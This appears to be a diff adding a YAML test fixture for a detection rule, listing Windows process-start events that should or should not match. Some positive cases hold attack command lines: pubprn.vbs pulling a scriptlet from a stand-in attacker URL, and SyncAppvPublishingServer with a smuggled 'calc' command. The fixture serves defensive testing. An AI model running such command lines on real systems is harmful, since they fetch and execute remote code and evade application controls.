@@ -1,0 +1,66 @@
+docs:
+- id: pubprn
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process:
+      name: cscript.exe
+      executable: C:\Windows\System32\cscript.exe
+      command_line: cscript C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:https://evil.example/a.sct
+      parent: {name: explorer.exe}
+- id: appv
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process:
+      name: powershell.exe
+      executable: C:\Windows\System32\powershell.exe
+      command_line: powershell SyncAppvPublishingServer.exe "n; calc"
+      parent: {name: explorer.exe}
+- id: bde
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process:
+      name: cscript.exe
+      executable: C:\Windows\System32\cscript.exe
+      command_line: cscript manage-bde.wsf
+      parent: {name: explorer.exe}
+- id: pubprn-printer
+  match: false
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process:
+      name: cscript.exe
+      executable: C:\Windows\System32\cscript.exe
+      command_line: cscript pubprn.vbs \\srv1 "\\srv1\printer1"
+      parent: {name: explorer.exe}
+- id: cscript
+  match: false
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process:
+      name: cscript.exe
+      executable: C:\Windows\System32\cscript.exe
+      command_line: cscript C:\scripts\inventory.vbs
+      parent: {name: explorer.exe}
